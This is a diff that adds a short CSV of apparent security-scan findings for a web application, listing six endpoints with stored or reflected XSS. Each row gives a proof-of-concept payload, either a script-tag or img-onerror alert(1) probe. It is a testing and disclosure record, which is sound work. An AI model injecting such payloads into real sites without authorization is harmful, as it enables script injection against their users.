@@ -1,0 +1,7 @@
+run_id,endpoint,vulnerability,poc
+20260903-0942-0011,`/create_post` (POST),Stored XSS (content),`<script>alert(1)</script>`
+20260903-0942-0011,`/edit_post` (POST),Stored XSS (content),`<img src=x onerror=alert(1)>`
+20260903-0942-0011,`/settings` (POST),Stored XSS (name),`<script>alert(1)</script>`
+20260903-0942-0011,`/settings` (POST),Stored XSS (bio),`<script>alert(1)</script>`
+20260903-0942-0011,`/users?search=` (GET),Reflected XSS (search),`<script>alert(1)</script>`
+20260903-0942-0011,`/request_friend` (POST),Reflected XSS (username),`<script>alert(1)</script>`
